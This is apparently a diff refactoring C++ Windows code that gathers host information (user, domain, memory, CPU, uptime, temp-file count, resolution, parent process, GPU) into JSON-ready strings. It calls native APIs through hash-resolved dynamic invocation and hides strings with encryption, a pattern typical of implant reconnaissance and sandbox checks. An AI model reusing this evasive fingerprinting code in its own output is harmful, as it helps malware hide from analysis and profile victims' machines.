@@ -11,7 +11,7 @@
 static auto& dynamicInvoker = DynamicInvoker::get_instance();
 
 
-std::string getCurrentTime() {
+auto getCurrentTime() -> std::string {
     std::time_t now = std::time(nullptr);
     char* timeStr = std::ctime(&now);
     std::string result(timeStr);
@@ -21,7 +21,7 @@ std::string getCurrentTime() {
     return result;
 }
 
-std::string GetUsername() {
+auto GetUsername() -> std::string {
     WCHAR username[256];
     DWORD size = 256;
 
@@ -31,7 +31,7 @@ std::string GetUsername() {
     return "";
 }
 
-std::string GetHostname() {
+auto GetHostname() -> std::string {
     WCHAR hostname[MAX_COMPUTERNAME_LENGTH + 1];
     DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
 
@@ -41,7 +41,7 @@ std::string GetHostname() {
     return "";
 }
 
-std::string GetAccountPrivilege() {
+auto GetAccountPrivilege() -> std::string {
     HANDLE token = nullptr;
     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
         return "";
@@ -63,7 +63,7 @@ std::string GetAccountPrivilege() {
     std::string result;
     if (LookupAccountSidW(NULL, tokenUser->User.Sid, name, &nameLen, domain, &domainLen, &sidType)) {
         std::wstring raw = std::wstring(domain) + L"\\" + std::wstring(name);
-        result = EscapeJsonString(WideToUtf8(raw));  // 转义
+        result = EscapeJsonString(WideToUtf8(raw));  
     }
     else {
         result = "";
@@ -74,8 +74,7 @@ std::string GetAccountPrivilege() {
     return result;
 }
 
-// 返回物理内存大小 单位GB
-ULONG64 GetPhysicalMemory() {
+auto GetPhysicalMemory() -> ULONG64 {
     SYSTEM_MEMORY_USAGE_INFORMATION smui = { 0 };
     ULONG size = 0;
     NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(ZwQuerySystemInformationStruct.funcAddr, ZwQuerySystemInformationStruct.funcHash,
@@ -83,8 +82,8 @@ ULONG64 GetPhysicalMemory() {
     return smui.TotalPhysicalBytes / (1024 * 1024 * 1024);
 }
 
- // 返回CPU核心数
-ULONG64 GetCpuCoreNum(){
+ // CPU
+auto GetCpuCoreNum() -> ULONG64 {
     SYSTEM_BASIC_INFORMATION sbi = { 0 };
     ULONG size = 0;
     NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(ZwQuerySystemInformationStruct.funcAddr, ZwQuerySystemInformationStruct.funcHash,
@@ -92,20 +91,17 @@ ULONG64 GetCpuCoreNum(){
 
     return sbi.NumberOfProcessors;
 }
-// 返回系统启动时间（单位：秒）
-ULONG64 GetBootTime(){
+auto GetBootTime() -> ULONG64 {
     return AR_getTickcount64() / 1000;
 }
-// 返回系统启动时间（单位：分钟）
-ULONG64 GetBootTimeMinute() {
+auto GetBootTimeMinute() -> ULONG64 {
     return GetBootTime() / 60;
 }
-// TODO: 获取临时文件数量
-ULONG64 GetTempFileNum(){
+auto GetTempFileNum() -> ULONG64 {
     return 0;
 }
 
-std::string GetResolution(){
+auto GetResolution() -> std::string {
     int screenWidth = GetSystemMetrics(SM_CXSCREEN);
     int screenHeight = GetSystemMetrics(SM_CYSCREEN);
 
@@ -113,7 +109,7 @@ std::string GetResolution(){
 }
 
 // TODO: convert to NT impl
-std::string GetCurrentExeDir() {
+auto GetCurrentExeDir() -> std::string {
     char path[MAX_PATH];
     GetModuleFileNameA(NULL, path, MAX_PATH);
 
@@ -124,8 +120,7 @@ std::string GetCurrentExeDir() {
     return EscapeJsonString(dir);  
 }
 
-// 获取父进程pid
-DWORD GetParentProcessId() {
+auto GetParentProcessId() -> DWORD {
     PROCESS_BASIC_INFORMATION pbi;
     NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(NtQueryInformationProcessStruct.funcAddr, NtQueryInformationProcessStruct.funcHash,
 		GetCurrentProcess(), ProcessBasicInformation, &pbi, sizeof(pbi), nullptr);
@@ -137,8 +132,7 @@ DWORD GetParentProcessId() {
     }
 }
 
-// 返回父进程名
-std::string GetParentProcessName() {
+auto GetParentProcessName() -> std::string {
     DWORD pid = GetParentProcessId();
     HANDLE hProcess = NULL;
     OBJECT_ATTRIBUTES objAttr = { 0 };
@@ -166,7 +160,7 @@ std::string GetParentProcessName() {
     }
 }
 
-std::wstring GetCurrentExecutablePath(){
+auto GetCurrentExecutablePath() -> std::wstring {
     wchar_t buffer[MAX_PATH];
     DWORD length = GetModuleFileNameW(NULL, buffer, MAX_PATH);
     if (length == 0 || length == MAX_PATH)
@@ -177,13 +171,12 @@ std::wstring GetCurrentExecutablePath(){
 }
 
 
-int getTempFileCount()
+auto getTempFileCount() -> int
 {
     int fileCount = 0;
     DWORD dwRet;
     LPSTR pszOldVal = (LPSTR)malloc(MAX_PATH * sizeof(char));
 
-    // 从环境变量获取 TEMP 目录路径
     dwRet = GetEnvironmentVariableA(ENCRYPT_STR("TEMP"), pszOldVal, MAX_PATH);
     if (dwRet == 0 || dwRet > MAX_PATH) {
         free(pszOldVal);
@@ -192,8 +185,7 @@ int getTempFileCount()
 
     std::string tempDir = pszOldVal;
     tempDir += "\\*";
-    free(pszOldVal);  // 释放分配的内存
-
+    free(pszOldVal);  
     WIN32_FIND_DATAA data;
     HANDLE hFind = FindFirstFileA(tempDir.c_str(), &data);
     if (hFind == INVALID_HANDLE_VALUE) {
@@ -201,30 +193,29 @@ int getTempFileCount()
     }
 
     do {
-        // 跳过目录 `.` 和 `..`
         if (strcmp(data.cFileName, ".") == 0 || strcmp(data.cFileName, "..") == 0) {
             continue;
         }
 
-        // 仅统计文件，排除子目录
         if (!(data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
             fileCount++;
         }
 
     } while (FindNextFileA(hFind, &data) != 0);
 
-    FindClose(hFind);  // 关闭句柄
+    FindClose(hFind);  
 
 
     return fileCount;
 }
-std::string getTempFileCountStr()
+
+auto getTempFileCountStr() -> std::string
 {
     return std::to_string(getTempFileCount());
 }
 
 int getMaxGPUMemory(std::string* GPUName = nullptr){
-    // 初始化设备和设备上下文
+
     D3D_FEATURE_LEVEL featureLevel;
     ID3D11Device* device = nullptr;
     ID3D11DeviceContext* context = nullptr;
@@ -245,7 +236,6 @@ int getMaxGPUMemory(std::string* GPUName = nullptr){
         return FALSE;
     }
 
-    // 创建 DXGI Factory
     IDXGIFactory* dxgiFactory = nullptr;
     hr = CreateDXGIFactory(__uuidof(IDXGIFactory), (void**)&dxgiFactory);
     if (FAILED(hr)) {
@@ -253,7 +243,6 @@ int getMaxGPUMemory(std::string* GPUName = nullptr){
         return FALSE;
     }
 
-    // 遍历所有显卡适配器
     IDXGIAdapter* adapter = nullptr;
     UINT adapterIndex = 0;
     ULONG maxGPUMemory = 0; // MB
@@ -273,12 +262,11 @@ int getMaxGPUMemory(std::string* GPUName = nullptr){
         adapterIndex++;
     }
 
-    // 清理资源
+
     dxgiFactory->Release();
     device->Release();
 
     if (GPUName && !maxGPUName.empty()) {
-        // 转换 wstring -> UTF-8 string
         std::wstring_convert<std::codecvt_utf8<wchar_t>> conv;
         *GPUName = conv.to_bytes(maxGPUName);
     }
